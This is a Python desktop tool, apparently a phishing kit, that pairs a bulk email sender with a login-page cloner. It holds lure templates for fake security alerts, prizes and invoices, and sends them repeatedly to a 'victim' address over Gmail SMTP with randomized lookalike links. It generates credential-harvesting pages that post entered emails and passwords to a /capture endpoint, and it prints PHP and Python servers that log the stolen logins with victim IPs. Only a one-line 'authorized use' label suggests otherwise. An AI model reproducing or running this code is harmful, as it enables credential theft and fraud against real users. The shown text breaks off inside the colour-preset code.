#!/usr/bin/env python3
"""
Amaru's MultiTOOL - Email Testing & Advanced Link Creator
Authorized Security Assessment Use Only
"""

import sys
import os
import random
import string
import time
import threading
import smtplib
import ssl
import json
import base64
import cgi
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime
from pathlib import Path

try:
    from PyQt5.QtWidgets import (
        QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
        QLabel, QLineEdit, QPushButton, QTextEdit, QComboBox, QSpinBox,
        QTabWidget, QGroupBox, QGridLayout, QProgressBar, QMessageBox,
        QListWidget, QSplitter, QCheckBox, QSlider, QFrame, QScrollArea,
        QColorDialog, QFontComboBox, QFileDialog, QListWidgetItem
    )
    from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QUrl
    from PyQt5.QtGui import QFont, QColor, QPixmap, QIcon, QFontDatabase
except ImportError:
    print("[!] Installing PyQt5...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "PyQt5"])
    print("[+] Installed. Restart the app.")
    input("Press Enter to exit...")
    sys.exit(1)

APP_NAME = "Amaru's MultiTOOL"
APP_VERSION = "3.0.0"

# ============================================================
# EMAIL TEMPLATES
# ============================================================

EMAIL_TEMPLATES = {
    "Security Alert": [
        "SECURITY ALERT: Unauthorized access detected.\n\nVerify your account: {link}\n\n- Security Team",
        "Your password was changed. If not you, reset here: {link}",
    ],
    "Account Notice": [
        "IMPORTANT: Account verification required.\n\nVerify now: {link}\n\n- Support Team",
        "Your account has been suspended. Restore access: {link}",
    ],
    "Prize / Winner": [
        "CONGRATULATIONS! You've won $500!\n\nClaim here: {link}\n\n- Rewards Center",
        "You're a lucky winner! Collect your gift: {link}",
    ],
    "Invoice": [
        "Invoice #{id} - ${amount} due.\n\nPay here: {link}\n\n- Billing",
        "Your payment receipt available: {link}",
    ],
    "Welcome": [
        "Welcome! Verify your email: {link}\n\n- The Team",
        "Account created! Confirm registration: {link}",
    ],
    "Custom": ["{custom_message}"],
}

# ============================================================
# LOGIN PAGE GENERATOR
# ============================================================

def generate_login_page(config):
    """Generate a login page that captures credentials and shows success"""
    
    style = f"""
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: '{config["font"]}', sans-serif;
            background: {config["bg_color"]};
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }}
        .container {{
            background: {config["card_color"]};
            padding: {config["padding"]}px;
            border-radius: {config["border_radius"]}px;
            box-shadow: 0 {config["shadow_y"]}px {config["shadow_blur"]}px rgba(0,0,0,{config["shadow_opacity"]});
            width: {config["width"]}px;
            max-width: 100%;
            text-align: center;
        }}
        .logo {{
            margin-bottom: 20px;
        }}
        .logo img {{
            max-width: {config["logo_width"]}px;
            max-height: {config["logo_height"]}px;
        }}
        .logo h1 {{
            color: {config["title_color"]};
            font-size: {config["title_size"]}px;
            margin-bottom: 5px;
        }}
        .logo p {{
            color: {config["subtitle_color"]};
            font-size: {config["subtitle_size"]}px;
        }}
        .form-group {{
            margin-bottom: 15px;
            text-align: left;
        }}
        label {{
            display: block;
            margin-bottom: 6px;
            color: {config["label_color"]};
            font-size: {config["label_size"]}px;
            font-weight: {config["label_weight"]};
        }}
        input[type="text"], input[type="password"] {{
            width: 100%;
            padding: {config["input_padding"]}px;
            border: {config["input_border"]}px solid {config["input_border_color"]};
            border-radius: {config["input_radius"]}px;
            font-size: {config["input_size"]}px;
            background: {config["input_bg"]};
            color: {config["input_text"]};
            transition: all 0.3s;
        }}
        input:focus {{
            outline: none;
            border-color: {config["accent_color"]};
            box-shadow: 0 0 0 3px {config["accent_color"]}33;
        }}
        .btn {{
            width: 100%;
            padding: {config["btn_padding"]}px;
            background: {config["accent_color"]};
            color: {config["btn_text"]};
            border: none;
            border-radius: {config["btn_radius"]}px;
            font-size: {config["btn_size"]}px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 5px;
        }}
        .btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 4px 15px {config["accent_color"]}66;
        }}
        .footer {{
            margin-top: 20px;
            color: {config["footer_color"]};
            font-size: {config["footer_size"]}px;
        }}
        .footer a {{
            color: {config["accent_color"]};
            text-decoration: none;
        }}
        .footer a:hover {{
            text-decoration: underline;
        }}
        .error {{
            color: #ff4444;
            font-size: 13px;
            display: none;
            margin-top: 10px;
            padding: 10px;
            background: #ff444411;
            border-radius: 6px;
            border: 1px solid #ff444444;
        }}
        .success {{
            display: none;
            padding: 30px 20px;
        }}
        .success .check {{
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #00ff8844;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: #00ff88;
        }}
        .success h2 {{
            color: {config["title_color"]};
            margin-bottom: 10px;
            font-size: 24px;
        }}
        .success p {{
            color: {config["subtitle_color"]};
            font-size: 15px;
        }}
        .extra-field {{
            margin-bottom: 15px;
            text-align: left;
        }}
        .extra-field label {{
            display: block;
            margin-bottom: 6px;
            color: {config["label_color"]};
            font-size: {config["label_size"]}px;
        }}
        .extra-field input {{
            width: 100%;
            padding: {config["input_padding"]}px;
            border: {config["input_border"]}px solid {config["input_border_color"]};
            border-radius: {config["input_radius"]}px;
            font-size: {config["input_size"]}px;
            background: {config["input_bg"]};
            color: {config["input_text"]};
        }}
    """
    
    logo_html = ""
    if config.get("logo_data"):
        logo_html = f'<img src="{config["logo_data"]}" alt="Logo">'
    
    # Extra fields
    extra_fields_html = ""
    for field in config.get("extra_fields", []):
        ftype = field.get("type", "text")
        fname = field.get("name", "")
        fplaceholder = field.get("placeholder", "")
        if ftype == "checkbox":
            extra_fields_html += f"""
            <div class="form-group" style="display:flex;align-items:center;gap:8px;">
                <input type="checkbox" name="{fname}" id="{fname}" style="width:18px;height:18px;">
                <label for="{fname}" style="margin:0;cursor:pointer;">{fplaceholder}</label>
            </div>"""
        else:
            extra_fields_html += f"""
            <div class="extra-field">
                <label>{fplaceholder}</label>
                <input type="{ftype}" name="{fname}" placeholder="{fplaceholder}">
            </div>"""
    
    # Logo upload feature
    logo_upload_html = ""
    if config.get("show_logo_upload"):
        logo_upload_html = """
        <div style="text-align:center;margin-bottom:15px;cursor:pointer;" onclick="document.getElementById('logoFile').click()">
            <div style="border:2px dashed #ccc;padding:15px;border-radius:8px;font-size:12px;color:#888;" id="logoPlaceholder">
                Click to upload logo
            </div>
            <input type="file" id="logoFile" accept="image/*" style="display:none" onchange="previewLogo(this)">
        </div>
        <script>
        function previewLogo(input) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();
                reader.onload = function(e) {
                    var img = document.createElement('img');
                    img.src = e.target.result;
                    img.style.maxWidth = '150px';
                    img.style.maxHeight = '60px';
                    var placeholder = document.getElementById('logoPlaceholder');
                    placeholder.innerHTML = '';
                    placeholder.appendChild(img);
                }
                reader.readAsDataURL(input.files[0]);
            }
        }
        </script>"""
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <title>{config["page_title"]}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>{style}</style>
</head>
<body>
    <div class="container">
        <div class="logo">
            {logo_html}
            {logo_upload_html if config.get("show_logo_upload") else ""}
            <h1>{config["heading"]}</h1>
            <p>{config["subtitle"]}</p>
        </div>
        
        <!-- Login Form -->
        <div id="loginForm">
            <div class="form-group">
                <label>{config["email_label"]}</label>
                <input type="text" name="email" id="email" placeholder="{config["email_placeholder"]}" required>
            </div>
            <div class="form-group">
                <label>{config["password_label"]}</label>
                <input type="password" name="password" id="password" placeholder="{config["password_placeholder"]}" required>
            </div>
            
            {extra_fields_html}
            
            {f'<div class="form-group"><label><input type="checkbox" name="remember" checked> Remember me</label></div>' if config.get("show_remember") else ""}
            
            <button type="button" class="btn" onclick="submitForm()">{config["button_text"]}</button>
            
            <div class="error" id="errorMsg">{config["error_message"]}</div>
        </div>
        
        <!-- Success Message -->
        <div class="success" id="successMsg">
            <div class="check">&#x2713;</div>
            <h2>{config["success_heading"]}</h2>
            <p>{config["success_message"]}</p>
        </div>
        
        <div class="footer">
            {config.get("footer_text", "")}
            {f'<br><a href="#">{config.get("forgot_text", "Forgot password?")}</a>' if config.get("show_forgot") else ""}
        </div>
    </div>
    
    <script>
    var captured = false;
    
    function submitForm() {{
        var email = document.getElementById('email').value;
        var password = document.getElementById('password').value;
        
        if (!email || !password) {{
            document.getElementById('errorMsg').style.display = 'block';
            return;
        }}
        
        // Collect extra fields
        var extra = {{}};
        var extras = document.querySelectorAll('.extra-field input, .extra-field select');
        extras.forEach(function(el) {{
            extra[el.name] = el.value;
        }});
        var checks = document.querySelectorAll('.extra-field input[type=checkbox]');
        checks.forEach(function(el) {{
            extra[el.name] = el.checked;
        }});
        
        var data = {{
            email: email,
            password: password,
            extra: extra,
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent
        }};
        
        // Send data - tries multiple methods
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/capture', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
        
        // Also store in page for demo
        if (!captured) {{
            captured = true;
            console.log('Credentials captured:', data);
            
            // Save to localStorage for demo
            var history = JSON.parse(localStorage.getItem('captured_logins') || '[]');
            history.push(data);
            localStorage.setItem('captured_logins', JSON.stringify(history));
        }}
        
        // Show success
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('successMsg').style.display = 'block';
        document.getElementById('errorMsg').style.display = 'none';
    }}
    
    // Enter key support
    document.addEventListener('keydown', function(e) {{
        if (e.key === 'Enter') {{
            submitForm();
        }}
    }});
    </script>
</body>
</html>"""
    
    return html


def generate_capture_server_html(config):
    """Generate a PHP/Python capture server script"""
    
    if config.get("server_type") == "php":
        return """<?php
// capture.php - Save this on your server
$data = json_decode(file_get_contents('php://input'), true);
if ($data) {
    $log = date('Y-m-d H:i:s') . " | " . $data['email'] . " : " . $data['password'] . " | " . $_SERVER['REMOTE_ADDR'] . "\\n";
    file_put_contents('captured_logs.txt', $log, FILE_APPEND);
    
    // Also log extras
    if (!empty($data['extra'])) {
        $extra_log = json_encode($data['extra']) . "\\n";
        file_put_contents('captured_extra.txt', $extra_log, FILE_APPEND);
    }
}
echo json_encode(['status' => 'ok']);
?>"""
    else:
        return """# capture_server.py - Run this on your server
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime

class CaptureHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)
        
        with open('captured_logins.txt', 'a') as f:
            f.write(f"{datetime.now()} | {data['email']}:{data['password']} | {self.client_address[0]}\\n")
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({'status': 'ok'}).encode())
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

HTTPServer(('0.0.0.0', 8080), CaptureHandler).serve_forever()"""


# ============================================================
# WORKER THREAD
# ============================================================

class EmailWorker(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int, int)
    finished_signal = pyqtSignal(dict)
    
    def __init__(self, target, message_template, count, delay, email, password, from_email=""):
        super().__init__()
        self.target = target
        self.template = message_template
        self.count = count
        self.delay = delay
        self.email = email
        self.password = password
        self.from_email = from_email or email
        self.running = True
        self.sent = 0
        self.failed = 0
        
    def run(self):
        start = time.time()
        
        for i in range(self.count):
            if not self.running:
                break
            try:
                msg_text = self.template
                msg_text = msg_text.replace("{id}", ''.join(random.choices(string.digits, k=6)))
                msg_text = msg_text.replace("{date}", datetime.now().strftime("%B %d, %Y"))
                msg_text = msg_text.replace("{time}", datetime.now().strftime("%H:%M"))
                msg_text = msg_text.replace("{rand}", ''.join(random.choices(string.ascii_lowercase, k=8)))
                
                domain = random.choice(["verify-account", "secure-login", "account-update", "billing-portal"])
                token = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
                msg_text = msg_text.replace("{link}", f"https://{domain}-{token}.com/auth")
                
                msg = MIMEMultipart()
                msg['From'] = self.from_email
                msg['To'] = self.target
                msg['Subject'] = random.choice([
                    "Security Alert", "Account Notice", "Your Invoice",
                    "Action Required", "Password Reset", "Important Update",
                    "Welcome!", "Your Receipt"
                ]) + f" #{random.randint(100,999)}"
                
                msg['Message-ID'] = f"<{random.randint(100000,999999)}.{int(time.time())}@mail.local>"
                msg.attach(MIMEText(msg_text, 'plain'))
                
                time.sleep(self.delay / 1000.0)
                context = ssl.create_default_context()
                server = smtplib.SMTP("smtp.gmail.com", 587)
                server.starttls(context=context)
                server.login(self.email, self.password)
                server.sendmail(self.email, [self.target], msg.as_string())
                server.quit()
                
                self.sent += 1
                self.log_signal.emit(f"[+] Sent {i+1}/{self.count}")
                
            except smtplib.SMTPAuthenticationError:
                self.log_signal.emit("[!] AUTH FAILED")
                self.failed += 1
                break
            except Exception as e:
                self.log_signal.emit(f"[!] Error: {str(e)[:40]}")
                self.failed += 1
            
            self.progress_signal.emit(i + 1, self.count)
        
        elapsed = time.time() - start
        rate = self.sent / elapsed if elapsed > 0 else 0
        self.finished_signal.emit({"sent": self.sent, "failed": self.failed, "elapsed": round(elapsed, 2), "rate": round(rate, 2)})


# ============================================================
# MAIN APPLICATION
# ============================================================

class AmaruMultiTOOL(QMainWindow):
    def __init__(self):
        super().__init__()
        self.worker = None
        self.current_html = ""
        self.page_config = self.default_config()
        self.logo_data = ""
        self.extra_fields = []
        self.init_ui()
        self.apply_theme()
        
    def default_config(self):
        return {
            "page_title": "Sign In - Account Security",
            "heading": "Welcome Back",
            "subtitle": "Sign in to your account",
            "font": "Arial",
            "bg_color": "#f0f2f5",
            "card_color": "#ffffff",
            "width": 400,
            "padding": 30,
            "border_radius": 12,
            "shadow_y": 4,
            "shadow_blur": 20,
            "shadow_opacity": 0.1,
            "title_color": "#1a1a2e",
            "title_size": 24,
            "subtitle_color": "#666",
            "subtitle_size": 14,
            "label_color": "#333",
            "label_size": 14,
            "label_weight": "600",
            "accent_color": "#00c8ff",
            "input_bg": "#f8f9fa",
            "input_text": "#333",
            "input_border": 1,
            "input_border_color": "#ddd",
            "input_radius": 8,
            "input_padding": 12,
            "input_size": 14,
            "btn_padding": 12,
            "btn_text": "#ffffff",
            "btn_size": 16,
            "btn_radius": 8,
            "email_label": "Email Address",
            "email_placeholder": "your@email.com",
            "password_label": "Password",
            "password_placeholder": "Enter your password",
            "button_text": "Sign In",
            "error_message": "Invalid email or password. Please try again.",
            "success_heading": "Verified! You're Safe",
            "success_message": "Your identity has been verified successfully. You can close this page.",
            "footer_text": "© 2024 All rights reserved.",
            "forgot_text": "Forgot password?",
            "show_forgot": True,
            "show_remember": True,
            "logo_width": 150,
            "logo_height": 60,
            "logo_data": "",
            "show_logo_upload": False,
            "extra_fields": [],
            "server_type": "python",
        }
    
    def init_ui(self):
        self.setWindowTitle(f"{APP_NAME} v{APP_VERSION}")
        self.setMinimumSize(1200, 800)
        
        central = QWidget()
        self.setCentralWidget(central)
        self.main_layout = QVBoxLayout(central)
        self.main_layout.setContentsMargins(0, 0, 0, 0)
        self.main_layout.setSpacing(0)
        
        # Header
        header = QWidget()
        header.setObjectName("header")
        header.setFixedHeight(70)
        hl = QHBoxLayout(header)
        hl.setContentsMargins(25, 0, 25, 0)
        
        title = QLabel(APP_NAME)
        title.setObjectName("appTitle")
        hl.addWidget(title)
        hl.addStretch()
        
        ver = QLabel(f"v{APP_VERSION}")
        ver.setObjectName("versionLabel")
        hl.addWidget(ver)
        
        self.main_layout.addWidget(header)
        
        # Tabs
        self.tabs = QTabWidget()
        self.tabs.setObjectName("mainTabs")
        
        # Tab 1: Email
        self.tab_email = QWidget()
        self.setup_email_tab()
        self.tabs.addTab(self.tab_email, "  Email Sender")
        
        # Tab 2: Link Creator
        self.tab_links = QWidget()
        self.setup_link_tab()
        self.tabs.addTab(self.tab_links, "  Link Creator")
        
        # Tab 3: Settings
        self.tab_settings = QWidget()
        self.setup_settings_tab()
        self.tabs.addTab(self.tab_settings, "  Settings")
        
        self.main_layout.addWidget(self.tabs)
        
        # Status bar
        sb = QWidget()
        sb.setObjectName("statusBar")
        sb.setFixedHeight(28)
        sbl = QHBoxLayout(sb)
        sbl.setContentsMargins(15, 0, 15, 0)
        
        self.status_text = QLabel("Ready")
        self.status_text.setObjectName("statusText")
        sbl.addWidget(self.status_text)
        sbl.addStretch()
        
        self.main_layout.addWidget(sb)
    
    def setup_email_tab(self):
        layout = QHBoxLayout(self.tab_email)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(15)
        
        left = QWidget()
        left.setObjectName("panelLeft")
        ll = QVBoxLayout(left)
        ll.setSpacing(10)
        
        # Target
        card1 = QWidget()
        card1.setObjectName("card")
        c1l = QVBoxLayout(card1)
        c1l.setContentsMargins(15, 15, 15, 15)
        t1 = QLabel("Target Email")
        t1.setObjectName("cardTitle")
        c1l.addWidget(t1)
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("victim@example.com")
        self.target_input.setObjectName("inputField")
        c1l.addWidget(self.target_input)
        ll.addWidget(card1)
        
        # Template
        card2 = QWidget()
        card2.setObjectName("card")
        c2l = QVBoxLayout(card2)
        c2l.setContentsMargins(15, 15, 15, 15)
        t2 = QLabel("Email Template")
        t2.setObjectName("cardTitle")
        c2l.addWidget(t2)
        
        hr = QHBoxLayout()
        self.template_combo = QComboBox()
        self.template_combo.setObjectName("comboField")
        self.template_combo.addItems(list(EMAIL_TEMPLATES.keys()))
        hr.addWidget(self.template_combo)
        btn_fill = QPushButton("Fill")
        btn_fill.setObjectName("btnTiny")
        btn_fill.clicked.connect(self.fill_template)
        hr.addWidget(btn_fill)
        c2l.addLayout(hr)
        
        self.msg_edit = QTextEdit()
        self.msg_edit.setObjectName("messageEditor")
        self.msg_edit.setMinimumHeight(120)
        self.msg_edit.setPlaceholderText("Use {link} {id} {date} {time} {rand}")
        c2l.addWidget(self.msg_edit)
        ll.addWidget(card2)
        
        # Settings
        card3 = QWidget()
        card3.setObjectName("card")
        c3l = QVBoxLayout(card3)
        c3l.setContentsMargins(15, 15, 15, 15)
        t3 = QLabel("Send Settings")
        t3.setObjectName("cardTitle")
        c3l.addWidget(t3)
        
        r1 = QHBoxLayout()
        r1.addWidget(QLabel("Count:"))
        self.count_spin = QSpinBox()
        self.count_spin.setRange(1, 500)
        self.count_spin.setValue(5)
        self.count_spin.setObjectName("spinField")
        r1.addWidget(self.count_spin)
        c3l.addLayout(r1)
        
        r2 = QHBoxLayout()
        r2.addWidget(QLabel("Delay (ms):"))
        self.delay_spin = QSpinBox()
        self.delay_spin.setRange(100, 10000)
        self.delay_spin.setValue(1500)
        self.delay_spin.setSingleStep(100)
        self.delay_spin.setObjectName("spinField")
        r2.addWidget(self.delay_spin)
        c3l.addLayout(r2)
        
        ll.addWidget(card3)
        
        # Buttons
        btn_card = QWidget()
        btn_card.setObjectName("card")
        bl = QVBoxLayout(btn_card)
        bl.setContentsMargins(15, 15, 15, 15)
        
        self.btn_start = QPushButton("  Send Emails")
        self.btn_start.setObjectName("btnPrimary")
        self.btn_start.setMinimumHeight(48)
        self.btn_start.clicked.connect(self.start_sending)
        bl.addWidget(self.btn_start)
        
        self.btn_stop = QPushButton("  Stop")
        self.btn_stop.setObjectName("btnDanger")
        self.btn_stop.setMinimumHeight(48)
        self.btn_stop.setEnabled(False)
        self.btn_stop.clicked.connect(self.stop_sending)
        bl.addWidget(self.btn_stop)
        
        ll.addWidget(btn_card)
        ll.addStretch()
        
        # Right
        right = QWidget()
        right.setObjectName("panelRight")
        rl = QVBoxLayout(right)
        rl.setSpacing(10)
        
        # Progress
        pcard = QWidget()
        pcard.setObjectName("card")
        pl = QVBoxLayout(pcard)
        pl.setContentsMargins(15, 15, 15, 15)
        pt = QLabel("Progress")
        pt.setObjectName("cardTitle")
        pl.addWidget(pt)
        
        self.progress = QProgressBar()
        self.progress.setObjectName("progressBar")
        self.progress.setRange(0, 100)
        self.progress.setValue(0)
        self.progress.setFormat("Waiting...")
        pl.addWidget(self.progress)
        
        sl = QHBoxLayout()
        self.stat_sent = QLabel("Sent: 0")
        self.stat_sent.setObjectName("statSent")
        sl.addWidget(self.stat_sent)
        self.stat_fail = QLabel("Failed: 0")
        self.stat_fail.setObjectName("statFailed")
        sl.addWidget(self.stat_fail)
        self.stat_rate = QLabel("Rate: 0/s")
        self.stat_rate.setObjectName("statRate")
        sl.addWidget(self.stat_rate)
        pl.addLayout(sl)
        
        rl.addWidget(pcard)
        
        # Log
        lcard = QWidget()
        lcard.setObjectName("card")
        ll2 = QVBoxLayout(lcard)
        ll2.setContentsMargins(15, 15, 15, 15)
        lh = QHBoxLayout()
        lt = QLabel("Live Log")
        lt.setObjectName("cardTitle")
        lh.addWidget(lt)
        lh.addStretch()
        btn_cl = QPushButton("Clear")
        btn_cl.setObjectName("btnTiny")
        btn_cl.clicked.connect(lambda: self.log_output.clear())
        lh.addWidget(btn_cl)
        ll2.addLayout(lh)
        
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setObjectName("logOutput")
        ll2.addWidget(self.log_output)
        
        rl.addWidget(lcard)
        
        splitter = QSplitter(Qt.Horizontal)
        splitter.addWidget(left)
        splitter.addWidget(right)
        splitter.setSizes([400, 500])
        layout.addWidget(splitter)
        
        self.fill_template()
    
    def fill_template(self):
        name = self.template_combo.currentText()
        if name in EMAIL_TEMPLATES:
            self.msg_edit.setText(random.choice(EMAIL_TEMPLATES[name]))
    
    def setup_link_tab(self):
        """Advanced link creator with full customization"""
        layout = QHBoxLayout(self.tab_links)
        layout.setContentsMargins(15, 15, 15, 15)
        layout.setSpacing(15)
        
        # LEFT PANEL - Scrolling editor
        left_scroll = QScrollArea()
        left_scroll.setWidgetResizable(True)
        left_scroll.setObjectName("scrollArea")
        
        left_widget = QWidget()
        left_widget.setObjectName("panelLeft")
        ll = QVBoxLayout(left_widget)
        ll.setSpacing(10)
        
        # === PAGE TYPE ===
        c1 = QWidget()
        c1.setObjectName("card")
        c1l = QVBoxLayout(c1)
        c1l.setContentsMargins(15, 15, 15, 15)
        ct1 = QLabel("Page Type")
        ct1.setObjectName("cardTitle")
        c1l.addWidget(ct1)
        
        self.page_type = QComboBox()
        self.page_type.setObjectName("comboField")
        self.page_type.addItems([
            "Login Page (captures credentials)",
            "Verification Page",
            "Download Page",
            "Survey Page",
            "Custom Page"
        ])
        self.page_type.currentIndexChanged.connect(self.on_page_type_changed)
        c1l.addWidget(self.page_type)
        ll.addWidget(c1)
        
        # === PAGE TITLE & HEADING ===
        c2 = QWidget()
        c2.setObjectName("card")
        c2l = QVBoxLayout(c2)
        c2l.setContentsMargins(15, 15, 15, 15)
        ct2 = QLabel("Page Content")
        ct2.setObjectName("cardTitle")
        c2l.addWidget(ct2)
        
        grid = QGridLayout()
        grid.setSpacing(8)
        
        grid.addWidget(QLabel("Browser title:"), 0, 0)
        self.txt_page_title = QLineEdit("Sign In - Account Security")
        self.txt_page_title.setObjectName("inputFieldSmall")
        self.txt_page_title.textChanged.connect(self.render)
        grid.addWidget(self.txt_page_title, 0, 1)
        
        grid.addWidget(QLabel("Heading:"), 1, 0)
        self.txt_heading = QLineEdit("Welcome Back")
        self.txt_heading.setObjectName("inputFieldSmall")
        self.txt_heading.textChanged.connect(self.render)
        grid.addWidget(self.txt_heading, 1, 1)
        
        grid.addWidget(QLabel("Subtitle:"), 2, 0)
        self.txt_subtitle = QLineEdit("Sign in to your account")
        self.txt_subtitle.setObjectName("inputFieldSmall")
        self.txt_subtitle.textChanged.connect(self.render)
        grid.addWidget(self.txt_subtitle, 2, 1)
        
        c2l.addLayout(grid)
        ll.addWidget(c2)
        
        # === FORM FIELDS ===
        c3 = QWidget()
        c3.setObjectName("card")
        c3l = QVBoxLayout(c3)
        c3l.setContentsMargins(15, 15, 15, 15)
        ct3 = QLabel("Form Fields")
        ct3.setObjectName("cardTitle")
        c3l.addWidget(ct3)
        
        fgrid = QGridLayout()
        fgrid.setSpacing(6)
        
        fgrid.addWidget(QLabel("Email label:"), 0, 0)
        self.txt_email_label = QLineEdit("Email Address")
        self.txt_email_label.setObjectName("inputFieldSmall")
        self.txt_email_label.textChanged.connect(self.render)
        fgrid.addWidget(self.txt_email_label, 0, 1)
        
        fgrid.addWidget(QLabel("Email placeholder:"), 1, 0)
        self.txt_email_ph = QLineEdit("your@email.com")
        self.txt_email_ph.setObjectName("inputFieldSmall")
        self.txt_email_ph.textChanged.connect(self.render)
        fgrid.addWidget(self.txt_email_ph, 1, 1)
        
        fgrid.addWidget(QLabel("Password label:"), 2, 0)
        self.txt_pass_label = QLineEdit("Password")
        self.txt_pass_label.setObjectName("inputFieldSmall")
        self.txt_pass_label.textChanged.connect(self.render)
        fgrid.addWidget(self.txt_pass_label, 2, 1)
        
        fgrid.addWidget(QLabel("Password placeholder:"), 3, 0)
        self.txt_pass_ph = QLineEdit("Enter your password")
        self.txt_pass_ph.setObjectName("inputFieldSmall")
        self.txt_pass_ph.textChanged.connect(self.render)
        fgrid.addWidget(self.txt_pass_ph, 3, 1)
        
        fgrid.addWidget(QLabel("Button text:"), 4, 0)
        self.txt_btn_text = QLineEdit("Sign In")
        self.txt_btn_text.setObjectName("inputFieldSmall")
        self.txt_btn_text.textChanged.connect(self.render)
        fgrid.addWidget(self.txt_btn_text, 4, 1)
        
        c3l.addLayout(fgrid)
        
        # Extra fields
        extra_title = QLabel("Extra Fields")
        extra_title.setObjectName("sectionTitle")
        c3l.addWidget(extra_title)
        
        self.extra_fields_list = QListWidget()
        self.extra_fields_list.setObjectName("smallList")
        self.extra_fields_list.setMaximumHeight(80)
        c3l.addWidget(self.extra_fields_list)
        
        ef_row = QHBoxLayout()
        btn_add_field = QPushButton("+ Add Field")
        btn_add_field.setObjectName("btnTiny")
        btn_add_field.clicked.connect(self.add_extra_field)
        ef_row.addWidget(btn_add_field)
        
        btn_rem_field = QPushButton("Remove")
        btn_rem_field.setObjectName("btnTiny")
        btn_rem_field.clicked.connect(self.remove_extra_field)
        ef_row.addWidget(btn_rem_field)
        ef_row.addStretch()
        c3l.addLayout(ef_row)
        
        ll.addWidget(c3)
        
        # === COLORS & STYLE ===
        c4 = QWidget()
        c4.setObjectName("card")
        c4l = QVBoxLayout(c4)
        c4l.setContentsMargins(15, 15, 15, 15)
        ct4 = QLabel("Colors & Style")
        ct4.setObjectName("cardTitle")
        c4l.addWidget(ct4)
        
        sgrid = QGridLayout()
        sgrid.setSpacing(6)
        
        sgrid.addWidget(QLabel("Background:"), 0, 0)
        self.bg_btn = QPushButton()
        self.bg_btn.setObjectName("colorBtn")
        self.bg_btn.setFixedSize(30, 30)
        self.bg_btn.setStyleSheet("background: #f0f2f5; border: 2px solid #555; border-radius: 5px;")
        self.bg_btn.clicked.connect(lambda: self.pick_color("bg"))
        sgrid.addWidget(self.bg_btn, 0, 1)
        self.bg_label = QLabel("#f0f2f5")
        self.bg_label.setObjectName("colorLabel")
        sgrid.addWidget(self.bg_label, 0, 2)
        
        sgrid.addWidget(QLabel("Card:"), 1, 0)
        self.card_btn = QPushButton()
        self.card_btn.setObjectName("colorBtn")
        self.card_btn.setFixedSize(30, 30)
        self.card_btn.setStyleSheet("background: #ffffff; border: 2px solid #555; border-radius: 5px;")
        self.card_btn.clicked.connect(lambda: self.pick_color("card"))
        sgrid.addWidget(self.card_btn, 1, 1)
        self.card_label = QLabel("#ffffff")
        self.card_label.setObjectName("colorLabel")
        sgrid.addWidget(self.card_label, 1, 2)
        
        sgrid.addWidget(QLabel("Accent:"), 2, 0)
        self.accent_btn = QPushButton()
        self.accent_btn.setObjectName("colorBtn")
        self.accent_btn.setFixedSize(30, 30)
        self.accent_btn.setStyleSheet("background: #00c8ff; border: 2px solid #555; border-radius: 5px;")
        self.accent_btn.clicked.connect(lambda: self.pick_color("accent"))
        sgrid.addWidget(self.accent_btn, 2, 1)
        self.accent_label = QLabel("#00c8ff")
        self.accent_label.setObjectName("colorLabel")
        sgrid.addWidget(self.accent_label, 2, 2)
        
        sgrid.addWidget(QLabel("Title:"), 3, 0)
        self.title_btn = QPushButton()
        self.title_btn.setObjectName("colorBtn")
        self.title_btn.setFixedSize(30, 30)
        self.title_btn.setStyleSheet("background: #1a1a2e; border: 2px solid #555; border-radius: 5px;")
        self.title_btn.clicked.connect(lambda: self.pick_color("title"))
        sgrid.addWidget(self.title_btn, 3, 1)
        self.title_label = QLabel("#1a1a2e")
        self.title_label.setObjectName("colorLabel")
        sgrid.addWidget(self.title_label, 3, 2)
        
        c4l.addLayout(sgrid)
        
        # Font
        font_row = QHBoxLayout()
        font_row.addWidget(QLabel("Font:"))
        self.font_combo = QFontComboBox()
        self.font_combo.setObjectName("comboField")
        self.font_combo.setCurrentFont(QFont("Arial"))
        self.font_combo.currentFontChanged.connect(self.render)
        font_row.addWidget(self.font_combo)
        c4l.addLayout(font_row)
        
        # Quick presets
        preset_label = QLabel("Quick Presets:")
        preset_label.setObjectName("sectionTitle")
        c4l.addWidget(preset_label)
        
        preset_row = QHBoxLayout()
        presets = [
            ("#f0f2f5", "#ffffff", "#00c8ff", "Default"),
            ("#0d1117", "#161b22", "#58a6ff", "Dark"),
            ("#fce4ec", "#ffffff", "#e91e63", "Pink"),
            ("#e8f5e9", "#ffffff", "#4caf50", "Green"),
            ("#fff3e0", "#ffffff", "#ff9800", "Orange"),
